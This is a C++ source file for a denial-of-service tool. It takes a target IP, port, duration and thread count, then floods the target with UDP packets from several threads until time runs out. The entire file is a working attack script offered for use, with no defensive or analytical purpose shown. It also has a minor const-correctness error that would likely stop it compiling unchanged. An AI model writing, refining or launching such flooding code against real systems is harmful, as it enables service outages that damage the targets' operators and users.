#include <iostream>
#include <string>
#include <thread>
#include <vector>
#include <random>
#include <ctime>
#include <cstdlib>
#include <csignal>
#include <arpa/inet.h>
#include <unistd.h>
#include <stdexcept>

#define PAYLOAD_SIZE 20

// Struct to hold attack parameters
struct Attack {
    std::string ip;
    int port;
    int duration;

    // Constructor for initializing attack parameters
    Attack(const std::string& ip, int port, int duration)
        : ip(ip), port(port), duration(duration) {}

    // Function to generate a random payload (hexadecimal format: \xXX)
    void generate_payload(char *buffer, size_t size) {
        const char hex_chars[] = "0123456789abcdef";  // Hexadecimal characters
        for (size_t i = 0; i < size; i++) {
            buffer[i * 4] = '\\';  // Start of hex sequence
            buffer[i * 4 + 1] = 'x';  // Hex character
            buffer[i * 4 + 2] = hex_chars[rand() % 16];  // Random hex digit 1
            buffer[i * 4 + 3] = hex_chars[rand() % 16];  // Random hex digit 2
        }
        buffer[size * 4] = '\0';  // Null terminate the buffer
    }
};

// Global flag to handle program termination gracefully
volatile sig_atomic_t stop = 0;

// Function to handle SIGINT signal (Ctrl+C)
void handle_sigint(int sig) {
    std::cout << "\nStopping attack...\n";
    stop = 1;
}

// Function for the attack logic (this is called in each thread)
void attack_thread(const Attack &attack) {
    int sock;
    struct sockaddr_in server_addr;
    time_t endtime;

    // Generate the payload (buffer to hold the payload data)
    char payload[PAYLOAD_SIZE * 4 + 1];  // Each hex byte takes 4 chars (\xXX)
    attack.generate_payload(payload, PAYLOAD_SIZE);

    // Create UDP socket
    sock = socket(AF_INET, SOCK_DGRAM, 0);
    if (sock < 0) {
        throw std::runtime_error("Socket creation failed");
    }

    memset(&server_addr, 0, sizeof(server_addr));
    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(attack.port);
    if (inet_pton(AF_INET, attack.ip.c_str(), &server_addr.sin_addr) <= 0) {
        throw std::runtime_error("Invalid IP address");
    }

    // Set end time for the attack based on duration
    endtime = time(nullptr) + attack.duration;

    // Continuously send the payload until the time expires or stop is set
    while (!stop && time(nullptr) <= endtime) {
        ssize_t payload_size = strlen(payload);
        if (sendto(sock, payload, payload_size, 0, (const struct sockaddr *)&server_addr, sizeof(server_addr)) < 0) {
            std::cerr << "Send failed\n";
            close(sock);
            return;
        }
    }

    close(sock);
}

// Function to print the usage of the program
void usage() {
    std::cout << "Usage: ./fuck ip port duration threads\n";
    exit(1);
}

int main(int argc, char *argv[]) {
    if (argc != 5) {
        usage();
    }

    std::string ip = argv[1];
    int port = std::stoi(argv[2]);
    int duration = std::stoi(argv[3]);
    int threads = std::stoi(argv[4]);

    // Handle Ctrl+C gracefully
    signal(SIGINT, handle_sigint);

    std::vector<std::thread> thread_ids;
    Attack attack{ip, port, duration};

    std::cout << "Attack started on " << ip << ":" << port << " for " << duration << " seconds with " << threads << " threads\n";

    // Create threads to perform the attack
    try {
        for (int i = 0; i < threads; i++) {
            thread_ids.emplace_back(attack_thread, std::ref(attack));
        }

        // Wait for threads to finish
        for (auto &t : thread_ids) {
            t.join();
        }

        std::cout << "Attack finished. Exiting...\n";
    } catch (const std::exception &e) {
        std::cerr << "Error: " << e.what() << "\n";
        return 1;
    }

    return 0;
}